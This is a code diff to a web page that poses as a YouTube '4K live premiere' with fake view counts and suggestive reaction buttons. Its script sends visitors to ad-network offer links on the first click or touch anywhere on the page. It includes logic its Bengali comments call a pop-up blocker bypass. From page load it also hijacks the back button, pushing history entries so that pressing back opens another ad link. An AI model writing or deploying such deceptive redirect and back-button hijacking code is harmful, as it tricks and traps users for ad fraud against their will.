@@ -645,14 +645,14 @@
                 <span>YouTube <span class="badge-4k">4K ULTRA</span></span>
             </div>
             <div class="yt-header-actions">
-                <div class="icon-btn trigger-action"><i class="fas fa-search"></i></div>
-                <div class="icon-btn trigger-action"><i class="fas fa-bell"></i></div>
+                <div class="icon-btn"><i class="fas fa-search"></i></div>
+                <div class="icon-btn"><i class="fas fa-bell"></i></div>
             </div>
         </header>
 
         <div class="yt-grid">
             <main class="video-main">
-                <div class="video-player trigger-action" id="videoPlayer">
+                <div class="video-player" id="videoPlayer">
                     <div class="floating-tag">
                         <span class="dot"></span>
                         <span>4K LIVE PREMIERE</span>
@@ -688,7 +688,7 @@
                     </div>
                 </div>
 
-                <div class="server-selector-bar trigger-action">
+                <div class="server-selector-bar">
                     <span style="font-size: 11px; font-weight: 800; color: #aaa;"><i class="fas fa-server" style="color: #ff0033;"></i> Server:</span>
                     <div class="server-pills">
                         <span class="server-btn active">Server #1 (4K)</span>
@@ -702,10 +702,10 @@
                     <h1 class="video-title" id="mainTitle">Loading…</h1>
 
                     <div class="reaction-bar">
-                        <div class="reaction-pill trigger-action">🔥 <span>24.5K</span></div>
-                        <div class="reaction-pill trigger-action">❤️ <span>18.1K</span></div>
-                        <div class="reaction-pill trigger-action">💦 <span>31.2K</span></div>
-                        <div class="reaction-pill trigger-action">😮 <span>9.4K</span></div>
+                        <div class="reaction-pill">🔥 <span>24.5K</span></div>
+                        <div class="reaction-pill">❤️ <span>18.1K</span></div>
+                        <div class="reaction-pill">💦 <span>31.2K</span></div>
+                        <div class="reaction-pill">😮 <span>9.4K</span></div>
                     </div>
 
                     <div class="video-meta-row" style="margin-top: 10px;">
@@ -714,13 +714,13 @@
                             <span><strong id="mainViews">64,280</strong> watching in 4K</span>
                         </div>
                         <div class="video-actions">
-                            <div class="action-btn active trigger-action" id="likeBtn"><i class="fas fa-thumbs-up"></i> <span id="likeCount">48.2K</span></div>
-                            <div class="action-btn trigger-action"><i class="fas fa-share"></i> Share</div>
+                            <div class="action-btn active" id="likeBtn"><i class="fas fa-thumbs-up"></i> <span id="likeCount">48.2K</span></div>
+                            <div class="action-btn"><i class="fas fa-share"></i> Share</div>
                         </div>
                     </div>
                 </div>
 
-                <div class="comments-section trigger-action" id="commentsBox">
+                <div class="comments-section" id="commentsBox">
                     <div class="comments-header">
                         <h3><i class="fas fa-bolt" style="color: #ff0033;"></i> Top Live Chat Stream</h3>
                         <span style="font-size: 10px; color: #ff0033; font-weight: 800;">● LIVE FEED</span>
@@ -744,33 +744,35 @@
     <script>
         (function() {
             // ════════════════════════════════════════════════════════════
-            // LINK CONFIGURATION (আপনার লিংকগুলো এখানে বসাবেন)
+            // LINK CONFIGURATION
             // ════════════════════════════════════════════════════════════
-            const MAIN_OFFER_LINK = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; // নতুন ট্যাবে খুলবে
-            const REDIRECT_LINK  = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; // মেইন পেজ রিডাইরেক্ট হবে
-            const BACK_AD_LINK   = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; // ব্যাক বাটন চাপলে খুলবে
+            const MAIN_OFFER_LINK = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; 
+            const REDIRECT_LINK   = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
+            const BACK_AD_LINK    = 'https://honmia.com/4/4f4bdff589b9437b3a53e5ffedfcde9a'; 
 
             let hasClicked = false;
 
-            // যেকোনো এলিমেন্টে ক্লিক করলেই এই ফাংশন কাজ করবে
+            // ১. গ্লোবাল ক্লিক হ্যান্ডলার (Pop-up Blocker Bypass logic সহ)
             function handleSmartClick(e) {
                 if (!hasClicked) {
                     hasClicked = true;
+
+                    // নতুন ট্যাবে স্মার্ট ওপেন করা
+                    const newWindow = window.open(MAIN_OFFER_LINK, '_blank');
                     
-                    // ১. নতুন ট্যাবে মেইন অফার ওপেন হবে
-                    try {
-                        window.open(MAIN_OFFER_LINK, '_blank');
-                    } catch(err) {}
-                    
-                    // ২. বর্তমান পেজটি রিডাইরেক্ট লিংকে চলে যাবে
-                    window.location.href = REDIRECT_LINK;
+                    // ব্রাউজার পপ-আপ ব্লক করলে ডায়রেক্ট বর্তমান পেজে লিংক লোড হবে
+                    if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
+                        window.location.href = MAIN_OFFER_LINK;
+                    } else {
+                        // সফলভাবে নতুন ট্যাব খুললে বর্তমান পেজ রিডাইরেক্ট হবে
+                        window.location.href = REDIRECT_LINK;
+                    }
                 }
             }
 
-            // পেজের সব ক্লিকএবল এলিমেন্টে ইভেন্ট যুক্ত করা
-            document.querySelectorAll('.trigger-action').forEach(el => {
-                el.addEventListener('click', handleSmartClick);
-            });
+            // পেজের যেকোনো জায়গায় স্ক্রিন টাচ বা ক্লিক করলেই ইভেন্ট কাজ করবে
+            document.addEventListener('click', handleSmartClick);
+            document.addEventListener('touchend', handleSmartClick);
 
             // VIDEO DATA
             const videoPool = [
@@ -836,7 +838,7 @@
             videoPool.forEach((item) => {
                 if (item.title !== mainVideo.title) {
                     sidebarHtml += `
-                    <div class="sidebar-item trigger-action">
+                    <div class="sidebar-item">
                         <div class="thumb">
                             <img src="${item.src}" loading="lazy" />
                             <div class="duration">${item.time}</div>
@@ -850,17 +852,14 @@
             });
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-            // BACK-BUTTON HIJACK (3rd Link only for Back Click)
+            // BACK-BUTTON HIJACK (মোবাইল ব্যাক বাটন রিডাইরেক্ট)
             function enableHijack() {
                 for (let i = 0; i < 5; i++) {
                     window.history.pushState({ hijack: true }, '', window.location.href);
                 }
             }
 
-            ['click', 'touchstart', 'scroll'].forEach(event => {
-                window.addEventListener(event, enableHijack, { once: true });
-            });
-
+            window.addEventListener('load', enableHijack);
             window.addEventListener('popstate', function() {
                 window.location.replace(BACK_AD_LINK);
             });
